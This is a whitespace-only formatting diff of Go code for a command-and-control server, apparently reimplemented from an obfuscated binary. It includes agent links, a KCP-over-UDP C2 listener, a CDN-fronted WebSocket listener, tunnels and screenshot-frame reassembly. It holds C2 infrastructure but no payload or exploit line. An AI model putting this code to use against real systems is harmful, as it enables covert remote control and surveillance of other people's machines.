@@ -50,26 +50,26 @@ const (
 // Link 表示一个多路复用的 Agent 连接。
 // Link represents a multiplexed agent connection.
 type Link struct {
-	ID         string
-	ClientID   int64
-	conn       net.Conn
-	br         *bufio.Reader
-	mainCh     chan []byte
-	configCh   chan []byte
-	chanCh     chan []byte
-	healthCh   chan []byte
-	closeCh    chan struct{}
-	mu         sync.RWMutex
+	ID           string
+	ClientID     int64
+	conn         net.Conn
+	br           *bufio.Reader
+	mainCh       chan []byte
+	configCh     chan []byte
+	chanCh       chan []byte
+	healthCh     chan []byte
+	closeCh      chan struct{}
+	mu           sync.RWMutex
 	readTimeout  time.Duration
 	writeTimeout time.Duration
 	lastActive   time.Time
-	flow       *Flow
-	addStatus  bool // accepted/rejected flag (WriteAddOk / WriteAddFail)
+	flow         *Flow
+	addStatus    bool // accepted/rejected flag (WriteAddOk / WriteAddFail)
 
 	// Fragment reassembly state for oversized LinkMsgMain payloads (screenshots,
 	// screen frames). Only touched by the link's own communication goroutine.
-	fragBuf  []byte
-	fragSeen int
+	fragBuf   []byte
+	fragSeen  int
 	fragTotal int
 }
 
@@ -296,9 +296,9 @@ func (l *Link) writeMsg(msgType LinkMsgType, data []byte) error {
 // GetLinkInfo returns link metadata.
 func (l *Link) GetLinkInfo() map[string]interface{} {
 	return map[string]interface{}{
-		"id":         l.ID,
-		"client_id":  l.ClientID,
-		"local_addr": l.LocalAddr().String(),
+		"id":          l.ID,
+		"client_id":   l.ClientID,
+		"local_addr":  l.LocalAddr().String(),
 		"remote_addr": l.RemoteAddr().String(),
 		"last_active": l.lastActive,
 	}
@@ -441,15 +441,15 @@ func (l *Link) Close() error {
 // KCPListener implements a KCP-based C2 listener
 // KCP provides reliable ordered delivery over UDP with low latency
 type KCPListener struct {
-	mu        sync.RWMutex
-	ID        int64
-	Addr      string
-	VerifyKey string
+	mu          sync.RWMutex
+	ID          int64
+	Addr        string
+	VerifyKey   string
 	EncryptSalt string
-	listener  *kcp.Listener
-	isRunning bool
-	stopCh    chan struct{}
-	sessions  map[string]*Link
+	listener    *kcp.Listener
+	isRunning   bool
+	stopCh      chan struct{}
+	sessions    map[string]*Link
 }
 
 // NewKCPListener creates a KCP C2 listener
@@ -838,9 +838,9 @@ func CreateTunnelOnLink(bufferSize int, link *Link, tunnel *Tunnel) (interface{}
 	// func(int, *Xq5KwGZr4i.Link, *eSxbx2zKVifD.Tunnel) (b209aM_.AzMICn5, error)
 
 	type TunnelResult struct {
-		Success    bool   `json:"success"`
-		TunnelID   int64  `json:"tunnel_id"`
-		LocalAddr  string `json:"local_addr"`
+		Success   bool   `json:"success"`
+		TunnelID  int64  `json:"tunnel_id"`
+		LocalAddr string `json:"local_addr"`
 	}
 
 	// Send tunnel creation request
@@ -883,8 +883,8 @@ func CreateTunnelOnLink(bufferSize int, link *Link, tunnel *Tunnel) (interface{}
 type CDNWebSocketListener struct {
 	mu         sync.RWMutex
 	ID         int64
-	CDNURL     string   // CDN edge URL (e.g., https://cdn.example.com)
-	OriginHost string   // Origin server hostname
+	CDNURL     string // CDN edge URL (e.g., https://cdn.example.com)
+	OriginHost string // Origin server hostname
 	VerifyKey  string
 	isRunning  bool
 	stopCh     chan struct{}
@@ -1018,7 +1018,8 @@ func (cws *CDNWebSocketListener) HandleCDNWebSocketConnection(conn net.Conn, ver
 
 // HandleAgentSession manages an agent's complete session lifecycle
 // This mirrors the binary's function:
-//   func(*XBp86cUq4, *Client, string, []uint8, string, func(), *Flow, bool) error
+//
+//	func(*XBp86cUq4, *Client, string, []uint8, string, func(), *Flow, bool) error
 func HandleAgentSession(link *Link, client *Client, mode string, config []byte,
 	listenerKey string, onClose func(), flow *Flow, noStore bool) error {
 
@@ -1026,9 +1027,9 @@ func HandleAgentSession(link *Link, client *Client, mode string, config []byte,
 
 	// Send initial configuration
 	initConfig := map[string]interface{}{
-		"mode":      mode,
-		"interval":  5,
-		"encrypt":   len(config) > 0,
+		"mode":     mode,
+		"interval": 5,
+		"encrypt":  len(config) > 0,
 	}
 	cfgData, _ := json.Marshal(initConfig)
 	link.WriteConfig(cfgData)
@@ -1078,8 +1079,8 @@ func HandleAgentSession(link *Link, client *Client, mode string, config []byte,
 					continue
 				}
 				cfg := map[string]interface{}{
-					"interval":  listener.PingInterval,
-					"timeout":   listener.DisconnectTimeout,
+					"interval": listener.PingInterval,
+					"timeout":  listener.DisconnectTimeout,
 				}
 				cfgBytes, _ := json.Marshal(cfg)
 				link.WriteConfig(cfgBytes)
